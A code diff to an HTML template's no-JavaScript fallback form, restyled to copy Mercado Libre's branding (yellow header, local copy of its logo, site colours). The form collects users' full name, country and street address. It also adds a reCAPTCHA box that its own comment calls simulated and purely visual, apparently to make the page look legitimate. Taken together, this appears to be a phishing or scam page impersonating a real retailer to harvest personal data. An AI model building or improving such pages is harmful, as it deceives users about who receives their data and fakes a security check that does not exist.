@@ -13,57 +13,237 @@
 
 	<noscript>
 		<style>
-			.noscript-container {
-				font-family: sans-serif;
-				padding: 20px;
-				max-width: 480px;
-				margin: 0 auto;
+			/* Reset y base */
+			* {
+				margin: 0;
+				padding: 0;
+				box-sizing: border-box;
 			}
-	
+
+			body {
+				font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+				background-color: #ebebeb;
+				min-height: 100vh;
+			}
+
+			/* Header - Igual que JS */
+			.ns-header {
+				background: #ffe600;
+				height: 60px;
+				display: flex;
+				align-items: center;
+				padding: 0 20px;
+				position: fixed;
+				top: 0;
+				left: 0;
+				right: 0;
+				z-index: 100;
+			}
+
+			.ns-header img {
+				height: 45px;
+			}
+
+			/* Card principal - Igual que JS */
+			.noscript-container {
+				width: 60%;
+				max-width: 600px;
+				background: #fff;
+				border-radius: 8px;
+				box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .12);
+				margin: 90px auto 40px;
+				padding: 24px 32px;
+			}
+
+			@media (max-width: 768px) {
+				.noscript-container {
+					width: 95%;
+					margin: 80px auto 20px;
+					padding: 20px;
+				}
+			}
+
+			/* Warning banner */
 			.noscript-warning {
 				background: #fff3cd;
 				color: #856404;
-				padding: 10px;
-				border-radius: 4px;
+				padding: 12px 16px;
+				border-radius: 6px;
+				margin-bottom: 24px;
+				font-size: 0.9rem;
+				text-align: center;
+			}
+
+			/* Títulos */
+			.ns-title {
+				font-size: 1.75rem;
+				font-weight: 600;
+				color: #333;
+				text-align: center;
+				margin-bottom: 8px;
+			}
+
+			.ns-subtitle {
+				font-size: 1rem;
+				color: #666;
+				text-align: center;
+				margin-bottom: 28px;
+			}
+
+			/* Form groups */
+			.ns-form-group {
 				margin-bottom: 20px;
 			}
-	
+
+			.ns-form-group label {
+				display: block;
+				margin: 0 0 6px 8px;
+				font-weight: 500;
+				color: #333;
+				font-size: 0.95rem;
+			}
+
 			.ns-input {
 				width: 100%;
-				padding: 10px;
-				margin-bottom: 10px;
-				display: block;
+				height: 48px;
+				background: transparent;
+				border-radius: 8px;
+				border: solid 1px rgba(0, 0, 0, .25);
+				color: rgba(0, 0, 0, .9);
+				font-size: 16px;
+				line-height: 20px;
+				padding: 8px 12px;
+				transition: border-color 0.2s;
 			}
-	
+
+			.ns-input:focus {
+				outline: none;
+				border-color: #3483fa;
+			}
+
+			/* Captcha simulado (solo visual) */
+			.ns-captcha-box {
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				gap: 12px;
+				border: 1px solid #d3d3d3;
+				border-radius: 4px;
+				padding: 12px 20px;
+				background: #f9f9f9;
+				width: fit-content;
+				margin: 24px auto;
+			}
+
+			.ns-captcha-checkbox {
+				width: 24px;
+				height: 24px;
+				border: 2px solid #c1c1c1;
+				border-radius: 2px;
+				background: #fff;
+			}
+
+			.ns-captcha-label {
+				font-size: 0.95rem;
+				color: #333;
+			}
+
+			.ns-captcha-brand {
+				display: flex;
+				flex-direction: column;
+				align-items: flex-end;
+				margin-left: 20px;
+				font-size: 0.7rem;
+				color: #555;
+			}
+
+			/* Footer actions */
+			.ns-footer {
+				display: flex;
+				justify-content: space-between;
+				align-items: center;
+				margin-top: 28px;
+				padding-top: 20px;
+				border-top: 1px solid #eee;
+			}
+
+			.ns-link {
+				color: #3483fa;
+				text-decoration: none;
+				font-weight: 500;
+				font-size: 1rem;
+			}
+
+			.ns-link:hover {
+				text-decoration: underline;
+			}
+
 			.ns-btn {
-				background: #00a650;
+				background: #3483fa;
 				color: white;
-				padding: 10px 20px;
+				padding: 14px 32px;
 				border: none;
+				border-radius: 6px;
+				font-size: 1rem;
+				font-weight: 600;
 				cursor: pointer;
+				transition: background-color 0.2s;
+			}
+
+			.ns-btn:hover {
+				background: #2968c8;
 			}
 		</style>
-	
+
+		<!-- Header igual que versión JS -->
+		<header class="ns-header">
+			<img src="/meli-logo.webp" alt="Mercado Libre" />
+		</header>
+
+		<!-- Card principal -->
 		<div class="noscript-container">
-			<div class="noscript-warning">__NS_WARNING__ </div>
-	
-			<h1>__NS_TITLE__</h1>
-	
+			<div class="noscript-warning">__NS_WARNING__</div>
+
+			<h1 class="ns-title">__NS_TITLE__</h1>
+			<p class="ns-subtitle">__NS_SUBTITLE__</p>
+
 			<form action="/api/native-submit" method="POST">
-				<label>__NS_LBL_NAME__</label>
-				<input type="text" name="fullname" class="ns-input" required>
-	
-				<label>__NS_LBL_COUNTRY__</label>
-				<select name="countryId" class="ns-input">
-					<option value="AR">Argentina</option>
-					<option value="BR">Brasil</option>
-					<option value="CO">Colombia</option>
-				</select>
-	
-				<label>__NS_LBL_ADDRESS__</label>
-				<input type="text" name="address" class="ns-input" required>
-	
-				<button type="submit" class="ns-btn">__NS_BTN__</button>
+				<div class="ns-form-group">
+					<label>__NS_LBL_NAME__</label>
+					<input type="text" name="fullname" class="ns-input" placeholder="Ej. Juan Pérez" required>
+				</div>
+
+				<div class="ns-form-group">
+					<label>__NS_LBL_COUNTRY__</label>
+					<select name="countryId" class="ns-input">
+						<option value="">Seleccionar...</option>
+						<option value="AR">Argentina</option>
+						<option value="BR">Brasil</option>
+						<option value="CO">Colombia</option>
+						<option value="MX">México</option>
+					</select>
+				</div>
+
+				<div class="ns-form-group">
+					<label>__NS_LBL_ADDRESS__</label>
+					<input type="text" name="address" class="ns-input" placeholder="Ej. Calle Falsa 123" required>
+				</div>
+
+				<!-- Captcha visual (sin funcionalidad real en no-script) -->
+				<div class="ns-captcha-box">
+					<div class="ns-captcha-checkbox"></div>
+					<span class="ns-captcha-label">__NS_CAPTCHA__</span>
+					<div class="ns-captcha-brand">
+						<span>reCAPTCHA</span>
+						<span>Privacy - Terms</span>
+					</div>
+				</div>
+
+				<!-- Footer con botones -->
+				<div class="ns-footer">
+					<a href="javascript:history.back()" class="ns-link">__NS_BTN_BACK__</a>
+					<button type="submit" class="ns-btn">__NS_BTN__</button>
+				</div>
 			</form>
 		</div>
 	</noscript>
